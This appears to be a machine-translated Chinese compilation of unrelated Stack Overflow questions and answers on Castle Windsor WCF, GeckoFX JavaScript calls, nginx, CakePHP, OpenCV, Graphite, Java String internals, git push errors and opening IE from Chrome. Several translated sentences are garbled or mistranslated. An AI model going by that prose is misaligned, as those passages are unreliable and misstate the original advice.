我几乎完成了一次大的 NHibernate 升级，最终也成为了 Castle 升级。除了 ASP.NET 网站无法运行之外，我已经快到了，因为我在 ServiceSecurityContext.Current 为空时遇到错误。我可能是错的（我还是 Castle 的新手），但我认为这与我对注册 WCF 设施所做的更改有关。

以前（在一个名为 ServiceLocator.cs 的类中）有这样的代码：

```
 /// <summary>
    /// Register the WindsorServiceHostFactory with the container
    /// </summary>
    public static void RegisterWcfServer()
    {
        RegisterWcfFacility();
        DefaultServiceHostFactory.RegisterContainer(Container.Kernel);
    } 
```

RegisterWcfFacility() 方法如下所示：

```
 private static void RegisterWcfFacility()
    {
        IFacility[] facilities = Container.Kernel.GetFacilities();
        bool hasWcfFacility = false;
        foreach (IFacility facility in facilities)
        {
            if (facility.GetType() != typeof (WcfFacility)) 
                continue;

            hasWcfFacility = true;
            break;
        }

        if (!hasWcfFacility)
            Container.AddFacility<WcfFacility>();
    } 
```

随后我把它改成了这个（因为我试图让它明显编译，而 DefaultServiceHostFactory 不再有“RegisterContainer”方法）：

```
 /// <summary>
    /// Register the WindsorServiceHostFactory with the container
    /// </summary>
    public static void RegisterWcfServer()
    {
        RegisterWcfFacility();

        // see:  http://stackoverflow.com/questions/9729395/castlewindsor-3-0-and-defaultservicehostfactory-registercontainer

        // obsolete:
        //DefaultServiceHostFactory.RegisterContainer(Container.Kernel);           

        Container.Register(Component.For<DefaultServiceHostFactory>());
    } 
```

我的新版本“RegisterWcfFacility()”如下所示：

```
 private static void RegisterWcfFacility()
    {
        var facilities = Container.Kernel.GetFacilities();
        var hasWcfFacility = facilities.Any(facility => facility.GetType() == typeof (WcfFacility));

        if (!hasWcfFacility)
            Container.AddFacility<WcfFacility>();
    } 
```

我只是发布这个主要是为了问一些问题：我完全是在吠叫错误的树吗？我注册这个设施的方式合法吗？这是否可以解释为什么我的 ServiceSecurityContext.Current 为空？（是的，我已经看到了）：

[https://groups.google.com/forum/#!topic/castle-project-devel/VOQKW4XlvLM%5B1-25%5D](https://groups.google.com/forum/#!topic/castle-project-devel/VOQKW4XlvLM%5B1-25%5D)

感谢您的任何建议。干杯，-戴夫

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-23T02:50:03.367

我刚遇到同样的问题，[在这里找到了答案](https://stackoverflow.com/questions/9729395/castlewindsor-3-0-and-defaultservicehostfactory-registercontainer)。原来你只是文件夹 App_Code 中的一个初始化类，如下所示：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using Castle.Windsor;
using Castle.Facilities.WcfIntegration;

namespace YourNamespace
{
    public static class InitialiseService
    {
        public static void AppInitialize()
        {
            var container = new WindsorContainer();

            container.AddFacility<WcfFacility>();
        }
    }
} 
```

当然，这依赖于从包管理器通过以下方式安装的 WCF Castle Facility：

```
install-package Castle.WcfIntegrationFacility 
```

希望这可以帮助 ：）

# java - 如何更改相对于游戏角色的手机屏幕视图

> ID：12009463
> 
> 赞同：0
> 
> 时间：2012-08-17T16:20:09.493
> 
> 标签：java, android

我不是在寻找教程或任何东西，我只是想更好地了解手机屏幕上的视图如何相对于更大区域内的角色发生变化。我制作了一张粗略的图片来帮助我缺乏清晰度。

手机看的地方怎么移动，我都不知道怎么表达，脑子也抓不住。

![在此处输入图像描述](../Images/98446663211253b5958c9f2f884e0fdf.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T16:59:05.553

让我试着用一个例子来表达你的问题：

假设您正在开发马里奥兄弟。现在整个关卡（图片中的黑框）是关卡开始直到马里奥到达城堡（进入下一个关卡）。红色框是用户可以在屏幕上看到的关卡的任何部分。现在您想知道如何实现这一点（对吧？）。

虽然我不是游戏开发者，但想到的简单逻辑是，当玩家向右移动时（实际上玩家在同一个地方），你只需要将关卡（背景）图像向左移动，如果你想生成 2D 深度效果，然后您将不得不使用称为[视差滚动的东西](http://en.wikipedia.org/wiki/Parallax_scrolling)

关注[此链接](http://obviam.net/index.php/getting-started-in-android-game-development-with-libgdx-create-a-working-prototype-in-a-day-tutorial-part-1/)可能会帮助您开发此类游戏

# c# - 使用 WinForms GeckoFX 控件从 C# 调用 javascript 函数的推荐方法是什么？

> ID：12009473
> 
> 赞同：1
> 
> 时间：2012-08-17T16:20:40.007
> 
> 标签：c#, javascript, winforms, geckofx

这些问题说明了一切。我已经把所有东西都连接好了，并且知道如何将消息从浏览器 html 发送到 c#，但不是相反。

我应该能够做类似的事情：

```
browserControl.JSCall("myFunction('Dave','Smith');"); 
```

...在网络代码中：

```
 function myFunction(firstName, lastName) {
       $("#mydiv").text(firstName + ' ' + lastName);
   } 
```

谢谢 - 戴夫

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-18T22:49:06.670

您可以使用导航来执行此操作：

```
browserControl.Navigate("javascript:void(myFunction('Dave','Smith'))"); 
```

请注意，我发现在应用程序事件循环执行之前，代码实际上并没有运行。如果这对您来说是个问题，您可以使用

```
Application.DoEvents(); 
```

确保您考虑[明确调用 DoEvents 的危险](https://stackoverflow.com/questions/5181777/use-of-application-doevents)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-08T23:08:24.030

我知道 AutoJSContext 类，所以不需要将 javascript 传递给 Navigate()。

```
 string outString = "";
    using (Gecko.AutoJSContext java = new Gecko.AutoJSContext(geckoWebBrowser1.JSContext))
    {
          java.EvaluateScript(@"window.alert('alert')", out outString );
    } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-12-28T08:35:25.050

亲爱的@SturmCoder 和@DavidCornelson 是对的。但似乎对于**版本 60.0.24.0**

**geckoWebBrowser1.JSCall()**

和

**Gecko.AutoJSContext()**接受**geckoWebBrowser1.JSContext**

是过时的，而不是**geckoWebBrowser1.JSContext**你应该写**geckoWebBrowser1.Window**

对我来说，这段代码有效：

```
string result = "";
using (Gecko.AutoJSContext js= new Gecko.AutoJSContext(geckoWebBrowser1.Window))
{
    js.EvaluateScript("myFunction('Dave','Smith');", out result);
} 
```

或者即使网站有 jQuery，你也可以这样运行：

```
string result = "";
using (Gecko.AutoJSContext js= new Gecko.AutoJSContext(geckoWebBrowser1.Window))
{
    js.EvaluateScript(@"alert($('#txt_username').val())", out result);
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-21T22:52:27.073

除了使用`Navigate`方法之外，您还有另一个解决方法：

```
var script = geckofx.Document.CreateElement("script");
script.TextContent = js;
geckofx.Document.GetElementsByTagName("head").First().AppendChild(script); 
```

# configuration - nginx：是否有可能有一个'catch all' error_page？

> ID：12009475
> 
> 赞同：2
> 
> 时间：2012-08-17T16:20:45.027
> 
> 标签：configuration, nginx, webserver

在查看 nginx 的[error_page](http://wiki.nginx.org/HttpCoreModule#error_page)指令的文档时，似乎必须手动列出 nginx（或上游服务器）可能返回的每个可能的状态代码。

例如：

```
error_page   404          /404.html;
error_page   502 503 504  /50x.html;
error_page   403          http://example.com/forbidden.html;
error_page   404          = @fetch; 
```

* * *

是否有为所有未直接指定的状态代码生成通配符...例如：

```
error_page   404          /404.html;
error_page   5xx          /50x.html; 
```

或者

```
error_page   404          /404.html;
error_page   502 503 504  /50x.html;
error_page   @catchall    /5xx.html; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T17:43:55.820

这不可能。

此外，不建议盲目列出所有代码，因为

*   nginx 允许重新定义所有响应代码，包括那些你真的不想重新定义的代码，除非在一些非常特殊的情况下（例如，你通常不想重新定义 304（未修改），并且可能不会重新定义 302（找到），除非有是非常具体的原因）；
*   重新定义一些错误代码可能弊大于利（例如重新定义 400 (Bad Request) 是一个坏主意）。

# php - cakephp 和可包含的行为

> ID：12009476
> 
> 赞同：0
> 
> 时间：2012-08-17T16:20:45.857
> 
> 标签：php, sql, json, cakephp, cakephp-2.1

我有以下json：

```
{
   "Companies":[
      {
         "CompanyPersonTask":{
            "company_id":"502d1844-3638-44dc-824c-14f02e0cc009",
            "person_id":"2",
            "task_id":"1"
         },
         "Company":{
            "id":"502d1844-3638-44dc-824c-14f02e0cc009",
            "name":"mostro",
            "Office":[
               {
                  "id":"502d1844-b90c-44f5-84c5-14f02e0cc009",
                  "company_id":"502d1844-3638-44dc-824c-14f02e0cc009",
                  "region":"Emilia-Romagna",
                  "city":"Rozzemilia",
                  "address":"-",
                  "phone":"-",
                  "legal_office":true
               }
            ],
            "CompanyPersonTask":[
               {
                  "company_id":"502d1844-3638-44dc-824c-14f02e0cc009",
                  "person_id":"2",
                  "task_id":"1"
               }
            ]
         },
         "Person":{
            "id":"2",
            "first_name":"Carlo",
            "last_name":"Giusti",
            "home_address":"Russi",
            "job_address":null,
            "phone":null,
            "fax":null,
            "mail":null,
            "full_name":"Giusti Carlo",
            "OfficePersonTask":[

            ],
            "CompanyPersonTask":[
               {
                  "company_id":"502d1844-3638-44dc-824c-14f02e0cc009",
                  "person_id":"2",
                  "task_id":"1"
               }
            ]
         },
         "Task":{
            "id":"1",
            "short_name":"Proprietario",
            "full_name":null,
            "info":null,
            "OfficePersonTask":[

            ],
            "CompanyPersonTask":[
               {
                  "company_id":"502d1844-3638-44dc-824c-14f02e0cc009",
                  "person_id":"2",
                  "task_id":"1"
               }
            ]
         }
      }
   ]
} 
```

这是通过此方法在 CompanyPersonTask 模型中创建的：

```
public function getCompaniesByRegion($region){
    $this->recursive = 2;
    return $this->find('all');   
} 
```

但我希望我的 json 格式如下：

```
{
   "Companies":[
      {
         "Company":{
            "id":"502d1844-3638-44dc-824c-14f02e0cc009",
            "name":"mostro",
            "Office":[
               {
                  "id":"502d1844-b90c-44f5-84c5-14f02e0cc009",
                  "company_id":"502d1844-3638-44dc-824c-14f02e0cc009",
                  "region":"Emilia-Romagna",
                  "city":"Rozzemilia",
                  "address":"-",
                  "phone":"-",
                  "legal_office":true
               }
            ]
         },
         "Person":{
            "id":"2",
            "first_name":"Carlo",
            "last_name":"Giusti",
            "home_address":"Russi",
            "job_address":null,
            "phone":null,
            "fax":null,
            "mail":null,
            "full_name":"Giusti Carlo"
         }
      }
   ]
} 
```

如何修改我的方法？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T18:14:49.963

使用可包含行为来过滤结果数据。有关更多说明，请参阅[此](http://book.cakephp.org/2.0/en/core-libraries/behaviors/containable.html)链接。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T16:33:43.473

您可以签`unbindModel`入 cake php 以即时删除关系。这将阻止不需要的表中的数据。[检查这个。](http://book.cakephp.org/2.0/en/models/associations-linking-models-together.html)

```
<?php
$this->Model->unbindModel(
    array('associationType' => array('associatedModelClassName'))
); 
```

# opencv - 在 BeagleBoard XM 上使用 OpenCV

> ID：12009477
> 
> 赞同：0
> 
> 时间：2012-08-17T16:20:50.343
> 
> 标签：opencv, beagleboard, angstrom-linux

我正在尝试在运行[Ångström Linux的](https://en.wikipedia.org/wiki/%C3%85ngstr%C3%B6m_distribution)[BeagleBoard](http://en.wikipedia.org/wiki/BeagleBoard) XM上编译简单的 OpenCV 代码。

我知道我在 OpenCV 中的方式，但只在 Windows 和[Visual Studio](http://en.wikipedia.org/wiki/Microsoft_Visual_Studio)下。我对非微软操作系统持公平态度。

我想我已经在 BeagleBoard 上安装了 OpenCV（`opkg install opencv`对吗？），并且我已经转移了我的代码，现在看起来像这样：

```
#include <opencv2/opencv.h>
int main()
{
    cv::Mat img(100, 100, CV_8U);
    cv::imshow("Hello world", img);
    cv::waitkey();
    return 0;
} 
```

如何在 BeagleBoard 下编译此代码？我怎样才能告诉它 .so 文件在哪里？OpenCV .so 文件在哪里？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T02:03:44.590

查看*[BeagleBoard 上的 ECE597 OpenCV 以](http://elinux.org/ECE597_Opencv_on_the_BeagleBoard)*获取安装说明。

如果您已正确安装它，则打开终端窗口并浏览到您放置代码的文件夹。在那里，使用以下命令编译文件“main.cpp”中的代码

```
g++ main.cpp -o out `pkg-config --cflags --libs opencv` 
```

代码编译完成后，使用以下命令执行。

```
./out 
```

另请查看 Stack Overflow 问题的答案*[如何在 Ångström Linux 上安装 OpenCV？](https://stackoverflow.com/questions/5682678)*.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T17:44:32.387

```
export LD_LIBRARY_PATH=/usr/local/lib
gcc `pkg-config --cflags opencv` -g -o NameOfProgram main.cpp `pkg-config --libs opencv` 
```

可能这些命令应该可以工作。如果需要，请不要忘记更改 cpp 文件名。看到[这个](http://it-it.facebook.com/note.php?note_id=135375324361)。

# javascript - 如何检查钳位数组中的每个值

> ID：12009478
> 
> 赞同：0
> 
> 时间：2012-08-17T16:20:51.847
> 
> 标签：javascript, html5-canvas

当我从画布 getImageData() 时，我得到一个 ImageData 对象，它带有一个 Data 子对象，它是一个钳位数组。我想检查我得到的每个像素是否都是白色的（而不是透明的）。换句话说，我想检查数据对象中的每个值是否都等于 255。显而易见的代码如下：

```
if (data.every(function(value) {return value == 255})) {
    //Do something
    } 
```

但由于某种原因，它在钳位数组中不起作用，如下面的最小代码所示：

```
var DATA = new Uint8ClampedArray(3);
//var DATA = new Array

DATA[0] = 255
DATA[1] = 255
DATA[2] = 255
DATA[3] = 255

alert(DATA.every(function(value) {return value == 255})) 
```

有什么解决办法吗？谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T16:28:37.227

您可以通过以下方式使用 Array 方法`.call()`：

```
alert([].every.call(DATA, function(v) { return v === 255; })); 
```

它不像你写的那样工作，因为`.every()`Uint8ClampedArray 原型上没有。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-17T16:29:02.167

您可以使用可以从原型中获取`Uint8ClampedArray`的`every()`函数来扩展`Array`原型；那么您的代码将正常工作。

```
Uint8ClampedArray.prototype.every = Array.prototype.every; 
```

I guess this is the easiest way to do it, but note that it will break the `for ... in` loop (which shouldn't be used to iterate over arrays anyway...).

# graphite - 石墨：显示与先前值的变化

> ID：12009481
> 
> 赞同：14
> 
> 时间：2012-08-17T16:21:12.763
> 
> 标签：graphite

我正在向 Graphite 发送垃圾收集所花费的时间（通过 jmx 从 jvm 获取）。这是一个增加的计数器。他们是一种让 Graphite 每分钟绘制一次变化的方法，这样我就可以看到一个图表，显示每分钟在 GC 中花费的时间？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-09-08T14:35:49.477

您应该能够使用 Derivative 函数将计数器变为命中率，然后使用汇总函数将计数器变为您之后的时间范围。

```
&target=summarize(derivative(java.gc_time), "1min") # time spent per minute 
```

**衍生品（系列列表）**

```
This is the opposite of the integral function. This is useful for taking a 
running totalmetric and showing how many requests per minute were handled.

&target=derivative(company.server.application01.ifconfig.TXPackets) 
```

每次运行 ifconfig 时，RX 和 TXPacket 都较高（假设存在网络流量）。通过应用导数函数，您可以了解每分钟发送或接收的数据包，即使您只记录总数。

**总结（seriesList，intervalString，func='sum'，alignToFrom=False）**

```
Summarize the data into interval buckets of a certain size.
By default, the contents of each interval bucket are summed together. 
This is useful for counters where each increment represents a discrete event and
retrieving a “per X” value requires summing all the events in that interval. 
```

来源： http: [//graphite.readthedocs.org/en/0.9.10/functions.html](http://graphite.readthedocs.org/en/0.9.10/functions.html)

# java - 试图理解 Java String 的实现

> ID：12009483
> 
> 赞同：5
> 
> 时间：2012-08-17T16:21:28.667
> 
> 标签：java, string, size, primitive-types

我正在查看 String 的 openjdk 实现和私有的，每个实例成员看起来像：

```
public final class String
    implements java.io.Serializable, Comparable<String>, CharSequence
{
    /** The value is used for character storage. */
    private final char value[];

    /** The offset is the first index of the storage that is used. */
    private final int offset;

    /** The count is the number of characters in the String. */
    private final int count;

    /** Cache the hash code for the string */
    private int hash; // Default to 0

    [...]
} 
```

但我知道 Java 使用字符串的引用和池，以避免重复。我天真地期待一个 pimpl 成语，其中 String 实际上只是一个 impl 的引用。到目前为止我还没有看到。有人可以解释如果我放一个 String x，Java 将如何知道使用引用吗？我的一门课的成员？

附录：这可能是错误的，但如果我处于 32 位模式，我应该计算：4 个字节用于引用“值 []”，4 个字节用于偏移量，4 个字节用于计数，4 用于哈希类 String 的所有实例? 这意味着写“String x;” 在我的一个班级中，我的班级的“权重”自动增加了至少 32 个字节（我可能在这里错了）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T16:52:57.313

`intern()`偏移量/计数字段与池化/问题有些正交。当你有类似的东西时，偏移量和计数就会出现：

```
String substring = myString.substring(5); 
```

实现此方法的一种方法是：

*   分配一个新`char[]`的`myString.length() - 5`元素
*   将索引索引 5 中的所有元素复制到`myString.length()`myString 到新的`char[]`
*   `substring`是用这个新的`char[]`
    *   `substring.charAt(i)`直接去`chars[i]`
    *   `substring.length()`直接去`chars.length`

如您所见，这种方法是 O(N)——其中 N 是新字符串的长度——并且需要两次分配：新字符串和新字符 []。因此，相反，`substring`通过重用原始 char[] 但带有偏移量来工作：

*   `substring.offset`=`myString.offset + newOffset`
*   `substring.count`=`myString.count - newOffset`
*   用作`myString.chars`字符数组`substring`
    *   `substring.charAt(i)`去`chars[i+substring.offset]`
    *   `substring.length()`去`substring.count`

请注意，我们不需要创建新的 char[]，更重要的是，我们不需要将旧 char[] 中的 chars 复制到新的 char[] 中（因为没有新的）。所以这个操作只是 O(1) 并且只需要一个分配，即新字符串的分配。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-17T16:23:38.773

Java**总是**使用对任何对象的引用。没有办法让它不使用引用。至于字符串池，这是由编译器为字符串文字实现的，并在运行时通过调用[`String.intern`](http://docs.oracle.com/javase/1.5.0/docs/api/java/lang/String.html#intern%28%29). 很自然，大多数实现`String`都忽略了它是否正在处理常量池引用的实例。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-17T16:40:11.023

Java 字符串是不可变的。这意味着实现可以对内部表示做很多事情，而不会破坏任何应用程序代码。

请注意，Java[`String.intern()`](http://www.docjar.com/html/api/java/lang/String.java.html)已在 Oracle 的 JDK 实现中定义为原生的。*本机代码可以访问对象的所有字段，并且可以在水下更改引用*。因此，实现者所要做的就是将引用和偏移更改为字符串被实习的位置，瞧。当然，这破坏了类的不变性，因此这意味着 intern() 更新最好是线程安全的。

当您调用`intern()`新生成的字符串时，您可以检查这些字段会发生什么。如果什么都没发生，则可能是引用本身包含内存位置。Java 语言规范没有定义如何实现引用。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2017-08-03T16:48:01.263

接受的答案和其他答案已过时。在 Java 7 更新 6 之后，Java 中的字符串不再使用偏移量并且未针对子字符串优化进行调整。相反，每个子字符串都会创建该字符串的新副本。

如果您想使用原始字符串实现，则必须使用 CharSequence。

欲了解更多信息：[https ://jaxenter.com/the-state-of-string-in-java-107508.html](https://jaxenter.com/the-state-of-string-in-java-107508.html)

# actionscript-3 - 在 DataGrid itemRenderer 中将焦点从一个 itemRenderer 移到另一个 itemRenderer

> ID：12009484
> 
> 赞同：0
> 
> 时间：2012-08-17T16:21:34.510
> 
> 标签：actionscript-3, apache-flex, flex4, flex3, flex4.5

我有一个 mx: DataGrid，它有 4 列，其中 itemRenderer 具有以下设置：

Mx：数据网格：

```
<mx:DataGrid id="itensPedidoCompraList"
             width="100%"
             height="120"    
             dataProvider="{ model.pedidoCompra.itens }"
             editable="true"
             itemEditEnd="itensPedidoCompraList_itemEditEndHandler(event)"> 
```

Mx：数据网格列：

```
<mx:DataGridColumn headerText="{resourceManager.getString('cadastroPedidoCompra', 'ident.PercentualDesconto') }"
               width="60"
               textAlign="right"
               rendererIsEditor="true"
               editorDataField="data">
  <mx:itemRenderer>
             <fx:Component>
                   <mx:Canvas>
                         <input:NumberInput width="55"   number="@{data.percentualDesconto }"/>
                   </mx:Canvas>
        </fx:Component>
  </mx:itemRenderer> 
```

用户单击网格的行并单击要编辑的列。在他更改或添加值之后，ENTER 键并且必须将焦点移动到同一行中的另一列。我正在做的方式是移动到下面的列。

移动到右列的最佳方法是什么？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T16:51:54.573

请注意，DataGrid 在编辑行时具有以下功能：

*   `Enter`接受编辑并将焦点移至下一行（如果`editorUsesEnterKey`为真）
*   `TAB`或`SHIFT`-`TAB`接受编辑并将焦点移至下一列/上一列
*   `ESC`或`CTRL`-`.`取消编辑，保留焦点

您可以使用 的[editorUsesEnterKey](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/mx/controls/dataGridClasses/DataGridColumn.html#editorUsesEnterKey)属性禁用`Enter`键功能。`DataGridColumn`

```
<mx:DataGridColumn editorUsesEnterKey="false" /> 
```

改变行为以`ENTER`使焦点向右/向左移动有点麻烦。击键处理在下面的私有方法中完成。此侦听器在`DataGrid`的公共方法中添加`createItemEditor()`并在 中删除`destroyItemEditor()`。从理论上讲，您可以覆盖这些方法来更改此行为。

源 mx::DataGrid（注意选项卡在关键焦点更改处理程序中处理）

```
 private function editorKeyDownHandler(event:KeyboardEvent):void
    {
        // ESC just kills the editor, no new data
        if (event.keyCode == Keyboard.ESCAPE)
        {
            endEdit(DataGridEventReason.CANCELLED);
        }
        else if (event.ctrlKey && event.charCode == 46)
        {   // Check for Ctrl-.
            endEdit(DataGridEventReason.CANCELLED);
        }
        else if (event.charCode == Keyboard.ENTER && event.keyCode != 229)
        {
            // multiline editors can take the enter key.
            if (!_editedItemPosition)
                return;

            if (columns[_editedItemPosition.columnIndex].editorUsesEnterKey)
                return;

            // Enter edits the item, moves down a row
            // The 229 keyCode is for IME compatability. When entering an IME expression,
            // the enter key is down, but the keyCode is 229 instead of the enter key code.
            // Thanks to Yukari for this little trick...
            if (endEdit(DataGridEventReason.NEW_ROW) && !dontEdit)
                findNextEnterItemRenderer(event);
        }
    } 
```

# java - SQL 的 to_date 格式未显示

> ID：12009485
> 
> 赞同：0
> 
> 时间：2012-08-17T16:21:34.953
> 
> 标签：java, oracle, jdbc, resultset, jodatime

我有以下 SQL 查询

```
select to_date(start_date, 'dd-Mon-yy') AS start_date FROM table 
```

我也有以下 ResultSet 对象（rs）

```
rs.getDate("start_date") 
```

当我在 SQL 开发人员中直接针对数据库 (Oracle) 运行查询时，格式按预期返回 ( `08-AUG-12`)，但是当我使用 JDBC 在我的 Java 应用程序中运行查询时，它打印为`2012-08-08`.

我是否以正确的方式获取格式？我应该只选择列（日期数据类型），然后通过 JodaTime 的 DateTimeFormatter 进行格式化吗？我不确定我在这里做错了什么。

当我从 java.sql.Date 转换为 java.util.Date 时，也会发生同样的事情......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T16:23:47.247

您只是在此处转换为日期...您可能希望转换为字符串以进行输出。

```
TO_CHAR( mydate, 'mm-dd-yyyy' ) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T16:24:18.113

`Date`在 Java中处理对象时不考虑数据库格式。如果您想完全匹配函数中的格式，您可以使用`TO_CHAR`, 并将列作为`String`.

或者，您继续将列获取为`Date`，然后使用 进行相应的格式化`DateTimeFormatter`，例如。

# git - 推送时 Git 推送失败并显示“致命：早期 EOF”，但仅在一个文件上

> ID：12009493
> 
> 赞同：14
> 
> 时间：2012-08-17T16:21:55.970
> 
> 标签：git, msysgit, tortoisegit

当我尝试将纹理和文本文件添加到我的 repo 时，一切正常，但是当我尝试添加 .blend 文件时，我得到了这个错误。我已经尝试了很多我在这里和谷歌上找到的东西，但都没有奏效（都是用于克隆/拉取命令）

我正在使用 Tortoise git 1.7.8 和 Git 1.7.10 msysgit - 在最新构建失败后我更改为它们。

其他人将东西推送到 repo 没有问题，但我没有向他们发送 .blend 文件。

这是输出：

```
Pushing to ssh://git@x.x.x:x/home/git/gitrepo
Counting objects: 4, done.
Compressing objects: 100% (3/3)
Writing objects: 100% (3/3), 112.00 KiB | 116 KiB/s
Writing objects: 100% (3/3), 113.07 KiB | 116 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0)
fatal: early EOF
error: unpack failed: unpack-objects abnormal exit
To ssh://git@x.x.x:x/home/git/gitrepo
! [remote rejected] master -> master (n/a (unpacker error))
error: failed to push some refs to 'ssh://git@x.x.x:x/home/git/gitrepo' 
```

编辑：现在看来这是一个服务器问题，因为 github 有效。如果我找到解决方案，我会更新。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2013-04-16T09:33:10.777

*（此答案是一种解决方法，而不是解决方案。）*

我刚刚遇到了同样的问题（不能再使用 TortoiseGit/msysgit 推送我的更改）。由于解压过程中出现问题，可以通过禁用压缩来避免：

1.  文件夹/TortoiseGit/Settings 上的上下文菜单
2.  “编辑本地 .git/config”
3.  添加`compression = 0`到该`[core]`部分。

显然，禁用压缩可能会影响性能，因此请自行决定使用此解决方法。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2016-09-12T13:10:44.520

我只是要添加对我有用的东西，以防其他人偶然发现这个问题。

当您收到上述错误时，在命令行上执行以下命令以使大文件工作。

```
git config http.postBuffer 524288000 
```

请参阅[https://groups.google.com/forum/#!topic/gitlabhq/tNfe2POcY4E](https://groups.google.com/forum/#!topic/gitlabhq/tNfe2POcY4E)。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2018-03-27T09:25:04.477

您可能会溢出后缓冲区。

以下命令为我修复了症状：

```
git config http.postBuffer 524288000 
```

See this related issue: [https://stackoverflow.com/a/3605544/193785](https://stackoverflow.com/a/3605544/193785)

# asp.net - 要传递给类的 Web UI 控件

> ID：12009494
> 
> 赞同：0
> 
> 时间：2012-08-17T16:21:59.020
> 
> 标签：asp.net, vb.net, class

嘿，我在这里有这段代码：

```
ScriptManager.RegisterClientScriptBlock(Me.Page, GetType(String), "showNotifier", ";$(function() {showNotifier(3000,'#cf5050','" & msg & "');});", True) 
```

我想像这样放在一个类文件中：

```
Public Class topMsgNotifyer
   Public Shared Sub show(ByVal delay As Integer, ByVal colorOfBox As String, ByVal message As String)
      Try
          ScriptManager.RegisterClientScriptBlock(Me.Page, GetType(String), "showNotifier", ";$(function() {showNotifier(" & delay & ",'" & colorOfBox & "','" & message & "');});", True)
      Catch ex As Exception
      End Try
   End Sub
End Class 
```

当然，类文件中的 Me.Page 也有问题。

我可以通过以下方式获取当前页面名称：

```
Dim pageName = Path.GetFileName(Request.Path) 
```

从 asp.net 页面调用该类子而不是在页面本身上调用它时，我该如何纠正这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T17:05:21.917

您可以将 Page 对象传递给您的 show() 方法，但是，更好的方法是创建一个作为 BasePage 类的类，您的页面从该类继承。在那个类中，让你使用 show() 方法。因此，继承此 BasePage 的每个页面都可以访问该方法，并且 Me.Page 将可用。

传递 Page 对象：

```
Public Class topMsgNotifyer
   Public Shared Sub show(ByVal delay As Integer, ByVal colorOfBox As String, ByVal message As String, ByVal page as System.Web.UI.Page)
      Try
          ScriptManager.RegisterClientScriptBlock(page, GetType(String), "showNotifier", ";$(function() {showNotifier(" & delay & ",'" & colorOfBox & "','" & message & "');});", True)
      Catch ex As Exception
      End Try
   End Sub
End Class 
```

称它为：

```
topMsgNotifyer.show(30, "Red", "You did something wrong", Me.Page) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T17:20:12.967

这些事情通常在可以访问页面的用户控件中完成。

另一种选择是将 Page 变量作为参数传递给函数。
或者让您的函数使用脚本返回一个字符串，然后像您正在做的那样调用 RegisterClientScriptBlock。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-17T17:41:55.717

为什么人们说不要传递页面实例？我认为这没有错：

```
public static void clientOnLoadScript(System.Web.UI.Page instance, string script, bool addScriptTag = false)
{ 
    string toWrite = "$(window).load(function () { \n" + script + "\n });";

    instance.ClientScript.RegisterStartupScript(instance.GetType(),"OnLoad", toWrite,addScriptTag);
} 
```

然后只需调用该函数：

```
clientOnLoadScript(this,"script",true); 
```

这对我有用。祝你好运。

# html - 以编程方式从 Chrome（或其他浏览器）打开 IE

> ID：12009496
> 
> 赞同：0
> 
> 时间：2012-08-17T16:22:01.627
> 
> 标签：html, sqlite, internet-explorer, google-chrome, activex

我们正在尝试将我们的网络应用程序（医疗保健）迁移到 HTML5，并且对 Chrome 中的 SQLite 功能感到非常兴奋。我们的一个应用程序需要一个 ActiveX 组件（专有的所见即所得编辑器），这意味着我们必须使用 IE。然而，我们也遇到了一个障碍，因为我们不确定 IE 是否可以支持像 Chrome 这样的本地存储。

任何人都可以提供一些指示吗？

或者，我们正在考虑在非 IE 浏览器中保留主要应用程序，但只在 IE 中将所见即所得编辑器作为单独的浏览器窗口打开。简而言之，如果我在 Chrome（或其他非 IE 浏览器）中单击一个按钮，是否可以以编程方式在 Internet Explorer 上打开一个新窗口？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T16:24:33.657

没有浏览器插件是不可能的。

Chrome 中的主应用程序，IE 中的 WSIWYG 编辑器？听起来是个可怕的主意。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T16:29:10.483

指针：使用非专有的所见即所得编辑器。

[那里](https://github.com/akzhan/jwysiwyg) [有](http://markitup.jaysalvat.com/examples/)[很多](http://www.openwebware.com/) [东西](http://ckeditor.com/demo) [可以](http://nicedit.com/index.php) [找到](http://www.tinymce.com/index.php) 。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2019-05-17T01:48:15.043

不能直接从浏览器环境调用另一个可执行文件，会有很大的安全问题。

您可以安装浏览器插件或添加注册表来实现此目的。

最简单的解决方案是为 IE 添加**一个 URI 方案**，格式中的链接`ie:http://example.com`将启动 IE 并访问`http://example.com`。

要为 IE 添加 URI 方案，请添加 [此注册表](https://superuser.com/a/1437844/210250)：

```
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Classes\ie]
"URL Protocol"=""
@="URL:IE Protocol"

